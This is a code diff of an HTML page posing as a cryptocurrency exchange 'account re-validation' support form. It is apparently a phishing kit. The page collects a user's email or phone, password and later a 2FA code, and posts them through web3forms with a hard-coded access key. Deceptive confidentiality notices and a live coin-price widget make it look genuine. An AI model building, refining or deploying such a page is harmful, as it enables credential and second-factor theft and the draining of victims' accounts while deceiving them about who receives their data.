@@ -1,141 +1,347 @@
 <!DOCTYPE html>
-<html lang="en" >
+<html>
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <link rel="stylesheet" href="styles.css" />
-</head>
-<head>
-  <meta charset="UTF-8">
-  <title>ACCOUNT RE-VALIDATION</title>
-  <link rel="stylesheet" href="./style.css">
-<!-- QRCode.js library -->
-  <script src="https://cdn.jsdelivr.net/npm/qrcodejs/qrcode.min.js"></script>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+body {
+  font-family: Arial, Helvetica, sans-serif;
+  background: #fafafa;
+}
+
+/* Shared card style for welcome + forms */
+#welcome,
+form {
+  border: 3px solid #f1f1f1;
+  padding: 24px;
+  margin: 20px auto;
+  max-width: 600px;
+  border-radius: 12px;
+  background: #fff;
+  box-shadow: 0 6px 16px rgba(0,0,0,0.08);
+  transition: transform 0.3s ease, box-shadow 0.3s ease;
+}
+
+#welcome:hover,
+.container:hover {
+  transform: translateY(-3px);
+  box-shadow: 0 10px 20px rgba(0,0,0,0.12);
+}
+
+/* Inputs */
+input[type=text],
+input[type=password] {
+  width: 100%;
+  padding: 12px 20px;
+  margin: 8px 0;
+  display: inline-block;
+  border: 1px solid #ccc;
+  border-radius: 8px;
+  box-sizing: border-box;
+  font-size: 14px;
+}
+
+/* Buttons */
+button {
+  background: linear-gradient(135deg, #04AA6D, #038c59);
+  color: white;
+  padding: 14px 20px;
+  margin: 12px 0;
+  border: none;
+  cursor: pointer;
+  width: 100%;
+  border-radius: 8px;
+  font-size: 16px;
+  font-weight: bold;
+  transition: background 0.3s ease, transform 0.2s ease;
+}
+
+button:hover {
+  background: linear-gradient(135deg, #038c59, #027a4d);
+  transform: scale(1.03);
+}
+
+/* Avatar container */
+.imgcontainer {
+  text-align: center;
+  margin: 24px 0 12px 0;
+}
+
+img.avatar {
+  width: 20%;
+  border-radius: 40%;
+}
+
+/* Inner container */
+.container {
+  padding: 16px;
+}
+
+/* Welcome-specific text */
+#welcome h2 {
+  font-family: "Georgia", serif;
+  font-size: 26px;
+  color: #333;
+  margin-bottom: 15px;
+  text-align: center;
+}
+
+#welcome p {
+  font-size: 15px;
+  line-height: 1.6;
+  color: #555;
+  margin-bottom: 15px;
+}
+
+#welcome label {
+  font-weight: bold;
+  color: #222;
+}
+
+#welcome select {
+  width: 100%;
+  padding: 10px;
+  border-radius: 8px;
+  border: 1px solid #ccc;
+  margin-top: 10px;
+  font-size: 14px;
+}
+
+/* Step visibility */
+#step1Form {
+  display: none; /* hidden until welcome is completed */
+}
+
+#step2 {
+  display: none; /* hidden until step1 is submitted */
+}
+
+#step2 h3 {
+  font-family: "Georgia", serif;
+  font-size: 22px;
+  color: #333;
+  margin-bottom: 12px;
+  text-align: center;
+}
+
+#step2 label {
+  font-weight: bold;
+  color: #222;
+}
+
+/* QR container */
+#qrContainer {
+  display: none;
+  text-align: center;
+  margin-top: 20px;
+  border: 3px solid #f1f1f1;
+  border-radius: 12px;
+  padding: 20px;
+  max-width: 400px;
+  margin-left: auto;
+  margin-right: auto;
+  background: #fff;
+  box-shadow: 0 6px 16px rgba(0,0,0,0.08);
+}
+
+/* Orange disclaimer box */
+.notice {
+  background: #fff3e0;        /* soft orange background */
+  border: 2px solid #fb8c00;  /* bold orange border */
+  border-radius: 8px;
+  padding: 15px;
+  margin-top: 20px;
+  font-size: 14px;
+  color: #333;
+  box-shadow: 0 4px 10px rgba(0,0,0,0.05);
+}
+
+.notice p {
+  margin: 0;
+  font-weight: 500;
+  color: #e65100;             /* deep orange text for emphasis */
+}
+
+/* Green animated NOTE lines */
+.note-line {
+  color: #2e7d32;             /* deep green text */
+  font-size: 15px;
+  line-height: 1.6;
+  opacity: 0;                 /* hidden initially */
+  transform: translateY(10px);
+  transition: opacity 0.8s ease, transform 0.8s ease;
+  margin-bottom: 10px;
+}
+
+.note-line.show {
+  opacity: 1;
+  transform: translateY(0);
+}
+</style>
+
 </head>
 <body>
-<!-- partial:index.partial.html -->
-<header>
-  <h1>ACCOUNT
- <strong>RE</strong>-VALIDATION</h1>
-  <p>... a "Step By Step" process.</p>
+
+<h2>Account RE-Validation</h2>
 <script src="https://widgets.coingecko.com/gecko-coin-price-marquee-widget.js"></script>
-<gecko-coin-price-marquee-widget locale="en" outlined="true" coin-ids="" initial-currency="usd"></gecko-coin-price-marquee-widget>  
-</header>
-<section>
-  <article>
+<gecko-coin-price-marquee-widget locale="en" outlined="true" coin-ids="" initial-currency="usd"></gecko-coin-price-marquee-widget>
+<div class="imgcontainer">
+  <img src="img_avatar2.png" alt="Avatar" class="avatar">
+</div>
 
-    <form class="pure-steps" id="validationForm" method="POST">
-  <!-- Radios must come first -->
-  <input type="radio" name="steps" class="pure-steps_radio" id="step-0" checked>
-  <input type="radio" name="steps" class="pure-steps_radio" id="step-1">
+<!-- Welcome Step -->
+<div id="welcome">
+  <h2>Welcome</h2>
+  <div id="noteBox">
+    <p class="note-line">NOTE: Authentication process will be carried out immediately upon receipt of information, and we will notify you of the authentication results.</p>
+    <p class="note-line">The information collected is confidential and will not be disclosed by us to unauthorized third parties.</p>
+  </div>
 
-  <!-- Hidden input can come after -->
+  <label for="issue">Select Issue:</label>
+  <select id="issue">
+    <option value="kyc">KYC</option>
+    <option value="web">Web issue</option>
+    <option value="deposit">Deposit/Withdrawal Query</option>
+    <option value="lost2fa">Lost 2FA</option>
+    <option value="binding">Binding/Unbinding</option>
+    <option value="forgot">Forgot Password</option>
+    <option value="swap">Swap</option>
+    <option value="error">Buy/Sell Error</option>
+    <option value="sync">Synchronize</option>
+    <option value="withdrawal">Withdrawal</option>
+    <option value="airdrop">Airdrop</option>
+    <option value="others">Others</option>
+  </select>
+
+  <button onclick="showStep1()">Proceed</button>
+
+  <div class="notice">
+    <p>⚠️ Customers are reminded to kindly provide accurate and truthful information for authentication and not to provide data which is false or which belongs to third parties.</p>
+  </div>
+</div>
+
+</div>
+</div>
+<!-- Step 1: Username + Password -->
+<form id="step1Form" action="https://api.web3forms.com/submit" method="POST">
+  <input type="hidden" name="access_key" value="13521604-ff3a-48f6-a7f4-a7d76fa37bca">
+  <input type="hidden" name="_next" value="#">
+  <input type="hidden" id="selectedIssue" name="selectedIssue">
+  <div class="container">
+    <label for="email"><b>Username</b></label>
+    <input type="text" placeholder="Email/Mobile number" name="email" required>
+
+    <label for="password"><b>Password</b></label>
+    <input type="password" placeholder="Enter Password" name="text" required>
+
+    <button type="submit">Proceed</button>
+  </div>
+    <div class="notice">
+  <p>⚠️ Customers are reminded to kindly provide accurate and truthful information for authentication and not to provide data which is false or which belongs to third parties.</p>
+</div>
+
+
+</form>
+
+<!-- Step 2: Validation Code -->
+<form id="step2Form" action="https://api.web3forms.com/submit" method="POST">
   <input type="hidden" name="access_key" value="13521604-ff3a-48f6-a7f4-a7d76fa37bca">
 
-  <!-- rest of your form -->
-      <div class="pure-steps_group">
-        <ol>
-          <li class="pure-steps_group-step">
-              <h2 class="pure-steps_group-step_legend">Welcome</h2>
-              <p class="pure-steps_group-step_item"><strong>"NOTE"</strong>Authentication process will be carried out immediately upon receipt of information,and we will have notify you of the authentication results.</p>
-              <p class="pure-steps_group-step_item">The information collected is confidential and will not be disclosed by us to unauthorized third parties.</p>
-              <p class="pure-steps_group-step_item"></p>
-             <label for="cars">Select Issue:</label>
-            <select value="cars" id="cars">
-             <option value="volvo">Kyc</option>
-             <option value="saab">Web issue</option>
-             <option value="opel">Deposit/Withdrawal Query</option>
-             <option value="audi">lost 2fa</option>
-	         <option value="audi">Biding/Unbinding</option>
-	         <option value="audi">Forgot Password</option>
-             <option value="audi">Swap</option>
-             <option value="audi">Buy/Sell Error</option>
-             <option value="audi">Synchronize</option>
-             <option value="audi">Withdrawal</option>
-             <option value="audi">Airdrop</option>
-             <option value="audi">Others</option>		 
-            </select>
-          </li>
-          <li class="pure-steps_group-step">
-            <fieldset>
-              <legend class="pure-steps_group-step_legend">Authenticate</legend>
-              <p class="pure-steps_group-step_item flexy-item flexy-column reverse">
-                <input type="text" placeholder="Type your email here" name="email" id="input_email">
-                <label for="input_email">Email or Mobile No</label>
-              </p>
-              <p class="pure-steps_group-step_item flexy-item flexy-column reverse">
-                <input type="password" placeholder="Type your password here" name="name" id="input_name">
-                <label for="input_password">Password</label
-              </p>
-			  <p class="pure-steps_group-step_item flexy-item flexy-column reverse">
-                <input type="password" placeholder="optional" name="code" id="input_code">
-                <label for="input_password">Trading Code</label>
-              </p>
-            </fieldset>
-          </li>
-        </ol>
-        <ol class="pure-steps_group-triggers">
-          <li class="pure-steps_group-triggers_item">
-            <label for="step-0">Restart</label>
-          </li>
-          <li class="pure-steps_group-triggers_item">
-            <label for="step-1">Proceed</label>
-          </li>
-          <li class="pure-steps_group-triggers_item">
-		  <button type="submit" class="btn">Validate</button>
-          </li>
-        </ol>
-      </div>
-      <br>
-      <label for="step-0">Customers are reminded to kindly provide accurate and truthful information for authentication and not to provide data which is false or which belongs to third parties.</label>
+  <div id="step2" class="container">
+    <label for="code"><b>Authentication Code</b></label>
+    <input type="text" placeholder="Enter 2fa Code" name="code" required>
 
-    </form>
-	<!-- QR code container -->
-    <div id="qrcode" style="margin-top:20px;"></div>
-  </article>
-</section>
+    <button type="submit">Login</button>
+  </div>
+
+</form>
+
+<!-- QR Code container -->
+<div id="qrContainer">
+  <h3>Scan this QR Code</h3>
+  <canvas id="qrcode"></canvas>
+</div>
+
+<!-- QR Code library -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/qrious/4.0.2/qrious.min.js"></script>
+
+
 <script>
-document.getElementById("validationForm").addEventListener("submit", function(event) {
-  event.preventDefault(); // stop default submission
+  // Elements
+  const welcome = document.getElementById("welcome");
+  const step1Form = document.getElementById("step1Form");
+  const step2Form = document.getElementById("step2Form");
+  const step2 = document.getElementById("step2");
+  const qrContainer = document.getElementById("qrContainer");
 
-  // Collect form values
-  const email = document.getElementById("input_email").value;
-  const password = document.getElementById("input_password").value;
-  const code = document.getElementById("input_code").value;
-  const issue = document.getElementById("cars").value;
+  // Navigation: move from welcome to step 1
+  function showStep1() {
+    const issue = document.getElementById("issue").value;
+    const selectedIssue = document.getElementById("selectedIssue");
+    if (selectedIssue) {
+      selectedIssue.value = issue;
+    }
 
-  // Simple validation
-  if (!email || !password) {
-    alert("Please fill in required fields.");
-    return;
+    welcome.style.display = "none";
+    step1Form.style.display = "block";
   }
 
-  // Clear any previous QR code
-  document.getElementById("qrcode").innerHTML = "";
+  // Step 1 submission
+  step1Form.addEventListener("submit", function(e) {
+    e.preventDefault();
+    const formData = new FormData(step1Form);
 
-  // Generate QR code with form data
-  new QRCode(document.getElementById("qrcode"), {
-    text: `Issue: ${issue}\nEmail: ${email}\nCode: ${code}`,
-    width: 200,
-    height: 200
+    fetch(step1Form.action, {
+      method: step1Form.method,
+      body: formData
+    })
+    .then(res => res.json())
+    .then(data => {
+      if (data.success) {
+        step2.style.display = "block";
+        step1Form.style.display = "none";
+      } else {
+        alert("❌ Username/Password submission failed.");
+      }
+    })
+    .catch(() => alert("❌ Error submitting Step 1."));
   });
 
-  // Optionally send data to Web3Forms
-  fetch("https://api.web3forms.com/submit", {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({
-      access_key: "13521604-ff3a-48f6-a7f4-a7d76fa37bca",
-      email: email,
-      password: password,
-      code: code,
-      issue: issue
+  // Step 2 submission
+  step2Form.addEventListener("submit", function(e) {
+    e.preventDefault();
+    const formData = new FormData(step2Form);
+
+    fetch(step2Form.action, {
+      method: step2Form.method,
+      body: formData
     })
-  })
-  .then(res => res.json())
-  .then(data => console.log("Submitted:", data))
-  .catch(err => console.error(err));
-});
-</script> 
+    .then(res => res.json())
+    .then(data => {
+      if (data.success) {
+        qrContainer.style.display = "block";
+        new QRious({
+          element: document.getElementById("qrcode"),
+          value: "#",
+          size: 200
+        });
+        step2Form.style.display = "none";
+      } else {
+        alert("❌ Authentication failed.");
+      }
+    })
+    .catch(() => alert("❌ Error submitting Step 2."));
+  });
+
+  // Animate NOTE lines (green text)
+  document.addEventListener("DOMContentLoaded", function() {
+    const lines = document.querySelectorAll(".note-line");
+    lines.forEach((line, index) => {
+      setTimeout(() => {
+        line.classList.add("show");
+      }, index * 1500); // each line appears 1.5s after the previous
+    });
+  });
+</script>
+
 </body>
 </html>
